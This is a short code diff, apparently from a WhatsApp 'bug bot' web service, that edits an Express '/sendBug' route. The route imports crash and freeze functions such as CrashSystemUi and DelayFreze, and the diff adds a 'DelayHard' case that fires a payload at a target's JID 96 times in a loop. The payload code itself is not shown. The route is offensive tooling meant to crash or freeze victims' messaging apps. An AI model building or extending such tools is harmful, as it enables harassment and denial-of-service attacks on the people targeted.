@@ -10,6 +10,7 @@ const {
   disconnectAllActiveConnections,
   // Bug functions
   bleng,
+  DelayHard,
   DelayFreze,
   yhcv,
   CrashSystemUi,
@@ -355,15 +356,10 @@ router.get("/sendBug", async (req, res) => {
           }
           break;
 
-        case "crashbeta":
+        case "DelayHard":
           for (let i = 0; i < 96; i++) {
-            await crashbeta(sock, targetJid);
+            await DelayHard(sock, targetJid);
             await sleep(1500);
-            await crashfcnewxryy(sock, targetJid);
-            await sleep(1500);
-            await AhhCrot(sock, targetJid);
-            await sleep(1500);
-            
           }
           break;
           case "MarkNyawit":
